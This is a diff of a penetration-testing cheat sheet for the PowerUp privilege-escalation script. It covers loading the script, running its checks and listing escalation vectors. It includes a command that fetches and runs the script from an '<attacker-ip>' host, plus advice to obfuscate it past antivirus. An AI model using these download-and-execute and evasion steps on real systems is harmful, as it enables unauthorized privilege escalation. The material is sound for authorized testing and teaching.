@@ -1,4 +1,3 @@
-
 ## 🧰 What PowerUp Does
 
 PowerUp checks for:
@@ -18,23 +17,30 @@ PowerUp checks for:
 Clone the repository:
 ```
 git clone https://github.com/PowerShellMafia/PowerSploit.git
+```
+
+```
 cd PowerSploit/Privesc
 ```
 
 Or download only PowerUp:
+
+From PowerShell (attacker machine)
+
 ```
-# From PowerShell (attacker machine)
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1" -OutFile "PowerUp.ps1"
 ```
 
 ## ⚙️ Execution Options
 
 ### Import the Module
+
 ```
 Import-Module .\PowerUp.ps1
 ```
 
 ### Run All Checks
+
 ```
 Invoke-AllChecks
 ```
@@ -55,15 +61,26 @@ Invoke-AllChecks
 |`Get-ProcessTokenPrivilege`|Show token privileges for running processes|
 
 ### 🧪 Example Workflow
+
+Load PowerUp
+
 ```
-# Load PowerUp
 Import-Module .\PowerUp.ps1
+```
 
-# Run all checks
+Run all checks
+
+```
 Invoke-AllChecks
+```
 
-# Specific checks
+Specific checks
+
+```
 Invoke-ServiceUnquoted
+```
+
+```
 Get-RegAlwaysInstallElevated
 ```
 
@@ -79,12 +96,17 @@ Get-RegAlwaysInstallElevated
 |DLL hijack|Place malicious DLL in load path|## 📁 Transferring to Target
 ### 📁 Transferring to Target
 ### Method: PowerShell Web Download
+
 ```
 IEX (New-Object Net.WebClient).DownloadString('http://<attacker-ip>/PowerUp.ps1')
+```
+
+```
 Invoke-AllChecks
 ```
 
 Or host it with Python:
+
 ```
 python3 -m http.server 8080
 ```
@@ -96,9 +118,7 @@ powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker-ip
 ## 🛡️ OPSEC Considerations
 
 - PowerUp is **noisy** — may trigger AV or logging
-    
 - Consider obfuscating or encoding the script
-    
 - Prefer offline analysis when possible
 
 
